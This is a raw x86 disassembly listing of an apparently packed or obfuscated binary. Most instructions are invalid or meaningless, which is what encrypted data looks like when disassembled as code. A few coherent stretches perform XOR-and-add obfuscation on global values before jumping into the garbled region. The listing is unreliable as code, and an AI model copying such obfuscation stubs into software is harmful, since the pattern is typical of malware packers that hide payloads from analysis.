  409451:	mov    edi,0xf2791c4a
  409456:	loopne 0x409424
  409458:	lods   al,BYTE PTR ds:[esi]
  409459:	jb     0x409409
  40945b:	loope  0x4094cf
  40945d:	scas   al,BYTE PTR es:[edi]
  40945e:	pop    esp
  40945f:	sbb    al,0x4e
  409461:	stos   BYTE PTR es:[edi],al
  409462:	aad    0xed
  409464:	shl    BYTE PTR [ebx-0x29],0x83
  409468:	lea    edi,[esi-0x2a40de19]
  40946e:	mov    eax,ds:0x926190df
  409473:	les    eax,FWORD PTR [edx+0x6b]
  409476:	xlat   BYTE PTR ds:[ebx]
  409477:	adc    ebp,ebx
  409479:	ds (bad) 
  40947b:	jmp    0x91eb8150
  409480:	daa    
  409481:	add    eax,0xa817b482
  409486:	ds sbb eax,0xb2dbc5f5
  40948c:	push   ds
  40948d:	fnsave [ebx]
  40948f:	mov    ah,0x14
  409491:	push   ss
  409492:	cdq    
  409493:	and    bl,dh
  409495:	xchg   edx,eax
  409496:	out    0xb9,eax
  409498:	call   0xa3358c6b
  40949d:	shl    DWORD PTR [ebx],cl
  40949f:	cmc    
  4094a0:	push   ss
  4094a1:	xor    DWORD PTR [edx+0x3378e68f],ebx
  4094a7:	repz (bad) 
  4094a9:	dec    ecx
  4094aa:	push   ecx
  4094ab:	shr    BYTE PTR [ecx],0x3d
  4094ae:	fcmovbe st,st(0)
  4094b0:	stc    
  4094b1:	push   esi
  4094b2:	mov    edi,0x8251ae2a
  4094b7:	jmp    0xb61f:0xa02fab13
  4094be:	inc    eax
  4094bf:	pop    es
  4094c0:	mov    eax,ds:0x76771ea0
  4094c5:	lods   eax,DWORD PTR ds:[esi]
  4094c6:	bound  edi,QWORD PTR [esi+0x42]
  4094c9:	jmp    0x8b2d:0xd070ec64
  4094d0:	sub    al,0xa9
  4094d2:	inc    esi
  4094d3:	ins    BYTE PTR es:[edi],dx
  4094d4:	push   0x2d
  4094d6:	jle    0x4094b3
  4094d8:	xor    cl,BYTE PTR [edx]
  4094da:	xchg   BYTE PTR [eax],ch
  4094dc:	xlat   BYTE PTR ds:[ebx]
  4094dd:	lea    ebp,[esi]
  4094df:	cmp    eax,DWORD PTR [ecx-0x48b5d3aa]
  4094e5:	add    eax,0x84272c3
  4094ea:	ja     0x409532
  4094ec:	ins    DWORD PTR es:[edi],dx
  4094ed:	pushf  
  4094ee:	test   eax,0xbad9cee3
  4094f3:	lods   al,BYTE PTR ds:[esi]
  4094f4:	(bad)  
  4094f5:	in     eax,0xa3
  4094f7:	mov    ebp,0xfc3faab3
  4094fc:	ins    BYTE PTR es:[edi],dx
  4094fd:	or     eax,0xf7051af2
  409502:	daa    
  409503:	push   ebp
  409504:	rol    BYTE PTR [ecx+0x3c],1
  409507:	mov    WORD PTR [ebx-0x5b66a9cb],ss
  40950d:	mov    ds:0x13700546,eax
  409512:	or     eax,DWORD PTR [ebx-0x6fe89443]
  409518:	xor    dh,0x6f
  40951b:	dec    esp
  40951c:	ficomp DWORD PTR [edx+0x35]
  40951f:	push   ds
  409520:	mov    dl,0x1d
  409522:	test   eax,0xd3b05c65
  409527:	fisttp WORD PTR [edx+0x0]
  40952a:	adc    DWORD PTR [ecx+0x74],0x77a6884a
  409531:	ret    0x448d
  409534:	outs   dx,BYTE PTR ds:[esi]
  409535:	lahf   
  409536:	adc    BYTE PTR ds:0xa0d90fa3,bh
  40953c:	outs   dx,BYTE PTR ds:[esi]
  40953d:	jge    0x4095b4
  40953f:	das    
  409540:	mov    esp,0x1c3e362a
  409545:	test   ah,dl
  409547:	inc    esp
  409548:	pushf  
  409549:	test   ch,0xdf
  40954c:	loop   0x409562
  40954e:	inc    eax
  40954f:	into   
  409550:	cmc    
  409551:	call   0x47dc4290
  409556:	inc    ebp
  409557:	fistp  WORD PTR [ebp-0x7fa10ea4]
  40955d:	xor    BYTE PTR [ebp+0x252e4e5d],0xd9
  409564:	mov    bh,0x65
  409566:	inc    edx
  409567:	xor    eax,0xf8be7992
  40956c:	rol    al,1
  40956e:	mov    edi,0x56840eb1
  409573:	jne    0x40959b
  409575:	outs   dx,BYTE PTR ds:[esi]
  409576:	test   al,0xce
  409578:	sub    al,BYTE PTR [edx-0x20e1d610]
  40957e:	outs   dx,BYTE PTR ds:[esi]
  40957f:	pushf  
  409580:	scas   eax,DWORD PTR es:[edi]
  409581:	mov    al,ds:0x80080873
  409586:	lods   al,BYTE PTR ds:[esi]
  409587:	adc    ebp,ebx
  409589:	das    
  40958a:	inc    esi
  40958b:	int    0x46
  40958d:	sub    edi,edi
  40958f:	pop    ss
  409590:	inc    esp
  409591:	bound  ebx,QWORD PTR [ebp+ebx*1+0x5a]
  409595:	iret   
  409596:	jecxz  0x40952c
  409598:	out    dx,eax
  409599:	mov    dl,0x6f
  40959b:	dec    eax
  40959c:	ins    BYTE PTR es:[edi],dx
  40959d:	aaa    
  40959e:	lds    ebx,FWORD PTR [edi-0x139512f1]
  4095a4:	retf   0x7a3e
  4095a7:	call   0xffa7f926
  4095ac:	mov    DWORD PTR [ebx],ebx
  4095ae:	push   eax
  4095af:	popa   
  4095b0:	pushf  
  4095b1:	or     ch,dl
  4095b3:	stos   BYTE PTR es:[edi],al
  4095b4:	push   ecx
  4095b5:	mov    dh,0xc4
  4095b7:	jne    0x40959a
  4095b9:	dec    edi
  4095ba:	imul   esp,edi,0xa7cf0ac6
  4095c0:	addr16 xchg ecx,eax
  4095c2:	mov    ebp,0x1acb8ca8
  4095c7:	cmp    BYTE PTR [esi],0xa8
  4095ca:	and    esp,DWORD PTR [ebx+0x1ede514d]
  4095d0:	pushf  
  4095d1:	rcr    BYTE PTR [ebp+0x6ce0caa7],1
  4095d7:	xor    DWORD PTR [ebp+eiz*1+0x49],edi
  4095db:	lods   al,BYTE PTR ds:[esi]
  4095dc:	cwde   
  4095dd:	adc    dl,ah
  4095df:	cdq    
  4095e0:	outs   dx,BYTE PTR ds:[esi]
  4095e1:	pop    esi
  4095e2:	(bad)  
  4095e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095e4:	pop    edx
  4095e5:	xchg   edi,eax
  4095e6:	add    esp,DWORD PTR [ecx+eiz*1]
  4095e9:	ds call 0x406b0f
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e1c:0x5e2bca4e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	dec    ebx
  40960d:	mov    eax,ds:0x8162dc7
  409612:	ror    BYTE PTR [ebp-0x1a3e18c6],cl
  409618:	aaa    
  409619:	xchg   edi,eax
  40961a:	or     ch,ah
  40961c:	fisubr DWORD PTR [ebx-0x58]
  40961f:	mov    edi,0x87158068
  409624:	shl    BYTE PTR [edx-0x7d617bd1],1
  40962a:	fst    DWORD PTR [ecx-0x726ca8e6]
  409630:	(bad)  
  409631:	stos   BYTE PTR es:[edi],al
  409632:	or     edx,DWORD PTR [edx+0x9]
  409635:	cli    
  409636:	sub    al,0x7f
  409638:	repnz fsub QWORD PTR [ecx+0x4924f294]
  40963f:	mov    dl,0x29
  409641:	fcmovnb st,st(0)
  409643:	hlt    
  409644:	jecxz  0x4095e2
  409646:	sub    al,0xab
  409648:	fcomp  DWORD PTR ds:0x801d70da
  40964e:	jo     0x409673
  409650:	cmp    BYTE PTR [ebp-0x17df6d94],dh
  409656:	ret    
  409657:	pop    esi
  409658:	inc    eax
  409659:	pop    esi
  40965a:	cs ins BYTE PTR es:[edi],dx
  40965c:	loop   0x4095ff
  40965e:	adc    esi,DWORD PTR [ebx-0x30f006ae]
  409664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409665:	mov    gs,WORD PTR [edx+0x43]
  409668:	jmp    0xc67c3317
  40966d:	mov    al,0xf3
  40966f:	loop   0x409611
  409671:	mov    dh,0x5a
  409673:	jmp    0x946eed81
  409678:	cmp    DWORD PTR [eax+0x27],edi
  40967b:	cmp    al,0x3d
  40967d:	fisub  WORD PTR [edx]
  40967f:	xor    BYTE PTR [esi-0x79],ch
  409682:	nop
  409683:	push   ebx
  409684:	les    edi,FWORD PTR [esi-0x5b]
  409687:	test   eax,0x5f67fe8d
  40968c:	inc    ebp
  40968d:	add    eax,0x713fceb4
  409692:	or     edi,DWORD PTR [esi+ebx*8-0x78772233]
  409699:	stos   BYTE PTR es:[edi],al
  40969a:	lea    ebx,[edx+0x24]
  40969d:	cmp    al,0xb9
  4096a0:	adc    BYTE PTR [esi+0x5d],dl
  4096a3:	in     eax,0xff
  4096a5:	mov    cl,BYTE PTR [esi-0x5a8574c8]
  4096ab:	jl     0x4096d6
  4096ad:	push   ss
  4096ae:	bnd jns 0x4096e4
  4096b1:	inc    esi
  4096b2:	xchg   ebp,eax
  4096b3:	jecxz  0x4096d6
  4096b5:	fidivr WORD PTR [edx+esi*1-0x1af94396]
  4096bc:	mov    eax,0xbf9e160
  4096c1:	add    eax,ebp
  4096c3:	sbb    DWORD PTR [ebx],eax
  4096c5:	dec    ebx
  4096c6:	inc    ebp
  4096c7:	test   DWORD PTR [ebp+0x49],0x3af0b56d
  4096ce:	sbb    al,0x2e
  4096d0:	jmp    0xf1a3:0xa3c032a6
  4096d7:	lock jne 0x409665
  4096da:	cwde   
  4096db:	ss mov bh,0x22
  4096de:	cs cli 
  4096e0:	push   esp
  4096e1:	jp     0x409708
  4096e3:	aas    
  4096e4:	pop    eax
  4096e5:	and    ecx,eax
  4096e7:	gs stos DWORD PTR es:[edi],eax
  4096e9:	add    cl,BYTE PTR fs:[ecx-0x5425903]
  4096f0:	mov    bh,0x47
  4096f2:	and    al,0xe8
  4096f4:	push   ebp
  4096f5:	push   ds
  4096f6:	pop    esi
  4096f7:	loop   0x4096d7
  4096f9:	xchg   BYTE PTR [edx+0x6a2298a6],ah
  4096ff:	add    eax,0x9e086e25
  409704:	inc    eax
  409705:	inc    edx
  409706:	sahf   
  409707:	mov    ecx,0xac286cdd
  40970c:	neg    BYTE PTR ds:[ecx]
  40970f:	rcl    BYTE PTR [ecx+0x75],0x5f
  409713:	inc    esp
  409714:	add    eax,0x6f5fc90e
  409719:	in     eax,0x80
  40971b:	out    dx,al
  40971c:	xor    BYTE PTR [ecx+0x5ab3e0ff],0xe8
  409723:	(bad)  
  409724:	ds sti 
  409726:	int3   
  409727:	inc    ebx
  409728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409729:	xor    al,0xf9
  40972b:	push   esp
  40972c:	gs sub al,0x14
  40972f:	imul   ebp,DWORD PTR [ebp-0x6a],0x18
  409733:	mov    ds:0xe994926a,eax
  409739:	loope  0x4096c1
  40973b:	jge    0x409763
  40973d:	mov    eax,ds:0x6c16bb7c
  409742:	das    
  409743:	popf   
  409744:	inc    esp
  409745:	pop    ecx
  409746:	sub    dh,BYTE PTR [esi]
  409748:	(bad)  
  409749:	xchg   esp,eax
  40974a:	and    bh,BYTE PTR [eax-0x3b278457]
  409750:	add    eax,0xbe887c52
  409755:	cs clc 
  409757:	or     eax,0xd4bdf33e
  40975c:	mov    edi,0x8b4e9871
  409761:	xchg   ebx,eax
  409762:	push   ds
  409763:	and    bh,BYTE PTR [ebx-0x3c9b56c2]
  409769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40976a:	sub    BYTE PTR ds:0xaffb3f7a,dh
  409770:	mov    ah,BYTE PTR [ebx]
  409772:	dec    ebx
  409773:	cld    
  409774:	lea    esi,[edx]
  409776:	or     al,0x76
  409778:	lds    eax,FWORD PTR [eax]
  40977a:	sahf   
  40977b:	xor    eax,0x7b86a7f8
  409780:	ja     0x409748
  409782:	stos   DWORD PTR es:[edi],eax
  409783:	sahf   
  409784:	test   DWORD PTR ds:0x4f5e51aa,edx
  40978a:	pop    edx
  40978b:	rcr    DWORD PTR [ecx],1
  40978d:	int3   
  40978e:	mov    DWORD PTR [ebx+eiz*2+0x70],edi
  409792:	fadd   st,st(6)
  409794:	adc    eax,0x67fc9931
  409799:	repz jae 0x409722
  40979c:	aas    
  40979d:	and    ecx,edx
  40979f:	push   es
  4097a0:	inc    ebp
  4097a1:	push   cs
  4097a2:	and    esp,esp
  4097a4:	es add al,0xa0
  4097a7:	xrelease xchg BYTE PTR [esi-0x29],bh
  4097ab:	aad    0x73
  4097ad:	mov    ds:0x568ff0cb,eax
  4097b2:	out    0x47,al
  4097b4:	xchg   ah,dl
  4097b6:	call   DWORD PTR [eax]
  4097b8:	pop    ebx
  4097b9:	inc    edi
  4097ba:	sahf   
  4097bb:	xchg   esp,eax
  4097bc:	shl    BYTE PTR fs:[esi-0x4f],cl
  4097c0:	jo     0x409807
  4097c2:	fist   DWORD PTR [edi+0x22]
  4097c5:	lock ins DWORD PTR es:[edi],dx
  4097c7:	call   0x21ba:0x408288b4
  4097ce:	test   al,0xdd
  4097d0:	and    BYTE PTR [edi],dl
  4097d2:	rcl    ebp,cl
  4097d4:	sbb    dl,BYTE PTR [edi+0x434bdc]
  4097da:	shl    dl,1
  4097dc:	push   0xf575ad80
  4097e1:	mov    ds:0x1ae39d0f,eax
  4097e6:	sub    DWORD PTR [ecx+0x18],ebx
  4097e9:	mov    edx,0x3f3cf2ff
  4097ee:	ja     0x40980d
  4097f0:	out    dx,al
  4097f1:	lods   eax,DWORD PTR ds:[esi]
  4097f2:	mov    eax,ss
  4097f4:	xlat   BYTE PTR ds:[ebx]
  4097f5:	ret    0x47c2
  4097f8:	or     ebp,ebp
  4097fa:	(bad)  
  4097fb:	push   ss
  4097fc:	cmp    bl,0xa2
  4097ff:	push   es
  409800:	xor    edx,DWORD PTR [eax]
  409802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409803:	iret   
  409804:	mov    dh,0xd5
  409806:	and    esi,edi
  409808:	jecxz  0x4097af
  40980a:	push   ecx
  40980b:	xchg   ebx,eax
  40980c:	int3   
  40980d:	hlt    
  40980e:	lahf   
  40980f:	pop    es
  409810:	outs   dx,BYTE PTR ds:[esi]
  409811:	jb     0x409833
  409813:	push   edx
  409814:	xor    eax,0xcd2c081f
  409819:	out    0xa8,al
  40981b:	push   edi
  40981c:	mov    ebp,0x6cdd4d7f
  409821:	push   ss
  409822:	dec    ecx
  409823:	fistp  DWORD PTR [esi-0x4fa72ae1]
  409829:	outs   dx,DWORD PTR ds:[esi]
  40982a:	pushf  
  40982b:	retf   
  40982c:	ror    BYTE PTR ss:[ebx-0xa],0x81
  409831:	retf   0xc421
  409834:	dec    ebx
  409835:	pop    ss
  409836:	mov    eax,DWORD PTR [ebp-0xc]
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4337df
  40986f:	xor    DWORD PTR ds:0x433717,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4337db,0x4337ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433767,0x433813
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4336fb
  4098a6:	sub    DWORD PTR ds:0x4337df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	mov    ebp,0xb490ad02
  4098c5:	fnstcw WORD PTR [esi+0x7e]
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098cd:	mov    ecx,ecx
  4098cf:	dec    esp
  4098d0:	jb     0x409918
  4098d2:	add    BYTE PTR [ecx],0xf2
  4098d5:	dec    edi
  4098d6:	adc    al,0xf2
  4098d8:	push   0x34247849
  4098dd:	(bad)  
  4098de:	mov    eax,ds:0x280133e4
  4098e3:	sub    eax,0x6130cd
  4098e8:	jge    0x40991e
  4098ea:	add    DWORD PTR ds:0x1aa0d8e2,esp
  4098f0:	fdivr  QWORD PTR [ebx+0x1f6bbc5f]
  4098f6:	mov    ds:0x6f1d9037,al
  4098fb:	inc    esp
  4098fc:	ja     0x4098b4
  4098fe:	ret    
  4098ff:	fcmovu st,st(1)
  409901:	adc    BYTE PTR [edi-0x44],dh
  409904:	(bad)  
  409905:	das    
  409906:	aam    0x18
  409908:	leave  
  409909:	mov    ds:0x6fc89ecc,eax
  40990e:	clc    
  40990f:	mov    dh,0x4b
  409911:	shl    BYTE PTR [ecx+eax*4+0x4b],0x40
  409916:	xchg   ecx,eax
  409917:	and    BYTE PTR [edi-0x74],cl
  40991a:	pop    edi
  40991b:	in     al,dx
  40991c:	aad    0xa4
  40991e:	or     DWORD PTR [ebx+0x7d32bfcb],ebx
  409924:	inc    eax
  409925:	in     eax,dx
  409926:	xchg   edi,eax
  409927:	lock in eax,0xb5
  40992a:	retf   0x970d
  40992d:	pusha  
  40992e:	retf   
  40992f:	int    0xd5
  409931:	fisub  DWORD PTR [esi-0xcc5fe55]
  409937:	push   esi
  409938:	call   FWORD PTR ds:0x9fa61601
  40993e:	dec    esi
  40993f:	ss mov esp,0xb70760
  409945:	cmp    eax,0x38f7b5fe
  40994a:	call   0x247c020d
  40994f:	loop   0x409935
  409951:	leave  
  409952:	das    
  409953:	inc    DWORD PTR gs:[ebx-0x1771a4ae]
  40995a:	push   es
  40995b:	enter  0xfd46,0x5a
  40995f:	pop    DWORD PTR [edx]
  409961:	push   esp
  409962:	out    dx,eax
  409963:	dec    ebx
  409964:	xchg   edx,eax
  409965:	jns    0x409906
  409967:	out    dx,al
  409968:	out    0x9,al
  40996a:	mov    eax,ds:0xcecb908d
  40996f:	clc    
  409970:	(bad)  
  409971:	das    
  409972:	xor    BYTE PTR [ebx],al
  409974:	adc    BYTE PTR [edx],ah
  409976:	push   cs
  409977:	pop    ebx
  409978:	mov    ah,BYTE PTR [ebp+0x3f]
  40997b:	fldcw  WORD PTR [ecx]
  40997d:	cs jae 0x4099a7
  409980:	sub    eax,0xfbd3bcb0
  409985:	push   edx
  409986:	stos   BYTE PTR es:[edi],al
  409987:	add    eax,DWORD PTR [ecx-0x43]
  40998a:	push   edi
  40998b:	ds call 0x598c2f7a
  409991:	call   0xe4ce13ae
  409996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409997:	(bad)  
  409999:	ins    BYTE PTR es:[edi],dx
  40999a:	fbstp  TBYTE PTR [esi+0xa]
  40999d:	push   ss
  40999e:	sub    ch,BYTE PTR [edi]
  4099a0:	pushf  
  4099a1:	mov    ebp,0x6bf7f70d
  4099a6:	jns    0x409a22
  4099a8:	dec    eax
  4099a9:	les    esp,FWORD PTR [ebp-0x4ff86b87]
  4099af:	dec    ebx
  4099b0:	into   
  4099b1:	popa   
  4099b2:	jmp    0x409a03
  4099b4:	jmp    0x82a20fd7
  4099b9:	sub    BYTE PTR ds:0x4bbd8c6d,dh
  4099bf:	pop    ecx
  4099c0:	arpl   WORD PTR [eax+0x5a13356c],dx
  4099c6:	mov    al,ds:0x11c82f5f
  4099cb:	xchg   DWORD PTR [edx+0x53],eax
  4099ce:	jae    0x409a26
  4099d0:	sahf   
  4099d1:	enter  0x5b62,0x41
  4099d5:	and    al,0x3b
  4099d7:	call   0x5a80ce02
  4099dc:	(bad)  
  4099dd:	popf   
  4099de:	(bad)  
  4099e1:	mov    ch,0xc4
  4099e3:	pop    esi
  4099e4:	clc    
  4099e5:	pop    eax
  4099e6:	int3   
  4099e7:	sbb    DWORD PTR [edi],eax
  4099e9:	inc    edi
  4099ea:	push   cs
  4099eb:	xchg   esi,eax
  4099ec:	jl     0x4099ce
  4099ee:	jle    0x409a39
  4099f0:	pop    eax
  4099f1:	loop   0x4099e8
  4099f3:	dec    ebp
  4099f4:	ficomp WORD PTR [ebx-0x38]
  4099f7:	js     0x409a27
  4099f9:	adc    BYTE PTR [esi-0x25a2e14c],0x9
  409a00:	push   ebx
  409a01:	adc    eax,0x79c9e955
  409a06:	loopne 0x4099ce
  409a08:	sbb    al,0x15
  409a0a:	sub    BYTE PTR [eax+0x7],cl
  409a0d:	lock (bad) 
  409a0f:	retf   
  409a10:	sbb    eax,0x1309d975
  409a15:	mov    ch,0xce
  409a17:	sub    BYTE PTR [ecx],bh
  409a19:	fucomp st(0)
  409a1b:	out    0xa1,al
  409a1d:	sbb    DWORD PTR [esi-0x45],ecx
  409a20:	ret    
  409a21:	neg    DWORD PTR [eax]
  409a23:	mov    ds:0x76ae7189,eax
  409a28:	mov    ch,BYTE PTR [edi-0x70]
  409a2b:	cmp    edi,DWORD PTR [edx]
  409a2d:	pop    ebp
  409a2e:	cmc    
  409a2f:	imul   eax,DWORD PTR [ebp+0x1b45e9f],0xfffffff1
  409a36:	scas   eax,DWORD PTR es:[edi]
  409a37:	and    eax,0x9176721b
  409a3c:	and    dh,BYTE PTR [edx]
  409a3e:	mov    al,ds:0xa3744ec9
  409a43:	jne    0x409a9d
  409a45:	gs gs adc ebp,ebx
  409a49:	mov    eax,ds:0x5328576a
  409a4e:	test   eax,0x6daf9d4c
  409a53:	repz pop eax
  409a55:	cmc    
  409a56:	push   edx
  409a57:	out    0xe4,eax
  409a59:	mov    ecx,0x5f7f5683
  409a5e:	add    dl,BYTE PTR [edi]
  409a60:	sbb    BYTE PTR [esi+0x35bfc949],0xd9
  409a67:	lods   eax,DWORD PTR ds:[esi]
  409a68:	add    DWORD PTR ds:0xda4122ee,0xd620951e
  409a72:	mov    bh,0x56
  409a74:	inc    edi
  409a75:	ds add al,0x35
  409a78:	dec    DWORD PTR [bp-0x6bc4]
  409a7d:	push   ebp
  409a7e:	(bad)  
  409a7f:	arpl   WORD PTR [esi],di
  409a81:	jle    0x409a74
  409a83:	xlat   BYTE PTR ds:[ebx]
  409a84:	sub    DWORD PTR [eax+0x39],ebx
  409a87:	add    esp,DWORD PTR [edx]
  409a89:	jns    0x409a8b
  409a8b:	icebp  
  409a8c:	pop    esp
  409a8d:	(bad)  [ecx]
  409a8f:	jg     0x409a3b
  409a91:	mov    bh,0xfa
  409a93:	pushf  
  409a94:	cmp    esp,0x566cd09e
  409a9a:	pop    ebx
  409a9b:	rol    BYTE PTR [ebx+0x72],cl
  409a9e:	dec    esi
  409a9f:	jmp    0xc4f9ef3a
  409aa4:	cmc    
  409aa5:	or     BYTE PTR [edx+0xe940716],ch
  409aab:	xor    edi,DWORD PTR [esi+0x385fa602]
  409ab1:	sub    BYTE PTR [edi+0x5],ah
  409ab4:	sahf   
  409ab5:	test   DWORD PTR [edi+ebp*4-0x82d4bfa],edi
  409abc:	ja     0x409aaa
  409abe:	jbe    0x409b06
  409ac0:	mov    eax,ds:0xd5821a31
  409ac5:	ret    
  409ac6:	call   0x9a1a117a
  409acb:	pop    ecx
  409acc:	outs   dx,BYTE PTR ds:[esi]
  409acd:	jmp    0x409afc
  409acf:	pushf  
  409ad0:	repnz (bad) 
  409ad2:	sub    DWORD PTR [eax],ecx
  409ad4:	test   BYTE PTR [ebx],0x9e
  409ad7:	loopne 0x409b48
  409ad9:	addr16 dec ecx
  409adb:	mov    BYTE PTR [esi],bh
  409add:	and    BYTE PTR [edi+eiz*2+0x377301ca],ch
  409ae4:	adc    al,0x5b
  409ae6:	jns    0x409b49
  409ae8:	cs mov eax,0x65894521
  409aee:	popf   
  409aef:	dec    ebp
  409af0:	xchg   BYTE PTR [ebx-0x66],al
  409af3:	mov    edi,0x101daeb5
  409af8:	mov    ebp,0x657ba2dc
  409afd:	adc    al,BYTE PTR [eax]
  409aff:	imul   eax,DWORD PTR [esi-0x72d7b6ba],0x39
  409b06:	shr    BYTE PTR [ebp-0x78],cl
  409b09:	call   0xbc45149b
  409b0e:	mov    al,0x1d
  409b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b11:	and    dl,BYTE PTR [esi+0x57]
  409b14:	sbb    DWORD PTR ds:0x43379f,0x433753
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x34d8bfd4]
  409b32:	pop    ecx
  409b33:	jle    0x409b19
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	cmp    DWORD PTR [esi],esp
  409b3d:	jge    0x409b77
  409b3f:	ficomp WORD PTR [eax+0x66]
  409b42:	inc    esi
  409b43:	retf   
  409b44:	neg    esp
  409b46:	stos   BYTE PTR es:[edi],al
  409b47:	push   ecx
  409b48:	xlat   BYTE PTR ds:[ebx]
  409b49:	add    ebp,ebx
  409b4b:	and    ebp,DWORD PTR [edi+0x38450bc8]
  409b51:	inc    ecx
  409b52:	mov    esi,0xfc558580
  409b57:	shl    BYTE PTR [edx+ebx*4],0x77
  409b5b:	inc    ecx
  409b5c:	imul   edx,DWORD PTR [ebp-0x17],0xffffffcc
  409b60:	pop    ss
  409b61:	rcl    BYTE PTR [ebx+0x62],1
  409b64:	test   eax,ebx
  409b66:	test   al,0x85
  409b68:	xor    eax,0xc1c14478
  409b6d:	pop    edi
  409b6e:	fstp   QWORD PTR [ebx]
  409b70:	fnstenv [ebx]
  409b72:	pop    ecx
  409b73:	ror    BYTE PTR [edi],cl
  409b75:	dec    ebp
  409b76:	dec    eax
  409b77:	jle    0x409b85
  409b79:	ins    BYTE PTR es:[edi],dx
  409b7a:	dec    esi
  409b7b:	pmuludq mm5,QWORD PTR [ecx-0x15]
  409b7f:	rcr    BYTE PTR [edx+0x72],0x4a
  409b83:	popf   
  409b84:	iret   
  409b85:	jnp    0x409b41
  409b87:	adc    BYTE PTR [ecx],0xd4
  409b8a:	cmp    BYTE PTR [esi],0xbb
  409b8d:	xor    DWORD PTR [ebx-0x66],edx
  409b90:	and    DWORD PTR [ecx+ecx*8-0x29fb6b9a],0xb15a1385
  409b9b:	lock inc ebx
  409b9d:	or     DWORD PTR [edx-0x66],0x55ade733
  409ba4:	xor    ch,BYTE PTR [ebx+0x5e]
  409ba7:	pop    es
  409ba8:	imul   ebp,DWORD PTR [edi+ecx*1-0x15370943],0xfffffff2
  409bb0:	mov    edx,0x2dc992a5
  409bb5:	sub    bl,BYTE PTR [edx+0x2e42aaec]
  409bbb:	cmp    ebx,ecx
  409bbd:	fild   DWORD PTR [eax-0x33]
  409bc0:	jge    0x409b9d
  409bc2:	fbstp  TBYTE PTR [edi]
  409bc4:	or     DWORD PTR [ecx-0x24],eax
  409bc7:	dec    edi
  409bc8:	hlt    
  409bc9:	mov    edx,0x836deb3c
  409bce:	pop    edx
  409bcf:	and    ecx,DWORD PTR [edx-0x34680903]
  409bd5:	hlt    
  409bd6:	adc    ecx,DWORD PTR [esi-0x97ba262]
  409bdc:	jmp    0xe878:0x58a4d641
  409be3:	stos   BYTE PTR es:[edi],al
  409be4:	cmp    edx,DWORD PTR fs:[edx]
  409be7:	dec    edi
  409be8:	shl    DWORD PTR [edx-0x50],cl
  409beb:	mov    DWORD PTR [ebp-0x4e],edx
  409bee:	xchg   dh,al
  409bf0:	mov    DWORD PTR [ecx-0x27f507a2],eax
  409bf6:	sbb    esi,DWORD PTR [ebx+edi*8+0x27]
  409bfa:	arpl   WORD PTR ds:0xcecd623b,si
  409c00:	mov    WORD PTR [eax+0x42],cs
  409c03:	(bad)  
  409c05:	or     BYTE PTR [edx-0x1fa5fdd4],ah
  409c0b:	mov    cl,0x91
  409c0d:	dec    edx
  409c0e:	jns    0x409c36
  409c10:	add    bh,BYTE PTR [ebx+0x49]
  409c13:	adc    BYTE PTR [edi],dh
  409c15:	(bad)  
  409c16:	into   
  409c17:	mov    bl,0xa1
  409c19:	mov    ds:0xe88fd049,al
  409c1e:	call   0xdff7:0x683fb78
  409c25:	add    BYTE PTR [esi],0x52
  409c28:	repz test al,0x12
  409c2b:	pop    ss
  409c2c:	adc    dh,BYTE PTR [esi+0x47011b03]
  409c32:	pop    ss
  409c33:	jmp    0xb856:0x75a40757
  409c3a:	jecxz  0x409bde
  409c3c:	stos   DWORD PTR es:[edi],eax
  409c3d:	(bad)
  409c40:	mov    ecx,0x6ce1a722
  409c45:	and    eax,eax
  409c47:	ins    DWORD PTR es:[edi],dx
  409c48:	(bad)  
  409c49:	adc    al,0xd7
  409c4b:	leave  
  409c4c:	sbb    ebp,DWORD PTR [edx+0x42]
  409c4f:	and    esi,DWORD PTR [eax-0x31]
  409c52:	push   ebp
  409c53:	pop    ebx
  409c54:	stos   BYTE PTR es:[edi],al
  409c55:	data16 shl BYTE PTR [ecx+0x7f5fd19c],1
  409c5c:	and    al,0x2f
  409c5e:	xor    ah,BYTE PTR [edi-0x11]
  409c61:	xchg   BYTE PTR [ecx],ah
  409c63:	aam    0x8f
  409c65:	aad    0xe6
  409c67:	outs   dx,BYTE PTR ds:[esi]
  409c68:	adc    edi,DWORD PTR [ebx]
